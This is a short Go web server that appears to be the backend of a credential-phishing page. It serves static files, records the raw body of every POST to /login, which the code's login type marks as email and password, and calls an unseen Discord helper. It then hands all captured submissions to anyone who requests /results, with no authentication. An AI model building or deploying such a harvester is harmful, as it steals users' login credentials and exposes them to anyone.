package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"

	"./discordApi"
)

type loginStruct struct {
	Email    string
	Password string
}

var results []string

func main() {
	http.Handle("/", http.FileServer(http.Dir("./public")))
	http.HandleFunc("/login", loginHandler)
	http.HandleFunc("/results", resultsHandler)
	http.ListenAndServe(":3030", nil)
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		body, err := ioutil.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Error reading request body",
				http.StatusInternalServerError)
		}
		results = append(results, string(body))
		discordApi.CheckEnvs()
		fmt.Fprint(w, "POST done")
	} else {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
	}
}

func resultsHandler(w http.ResponseWriter, r *http.Request) {
	jsonBody, err := json.Marshal(results)
	if err != nil {
		http.Error(w, "Error converting response to json", http.StatusTeapot)
	}
	w.Write(jsonBody)
}
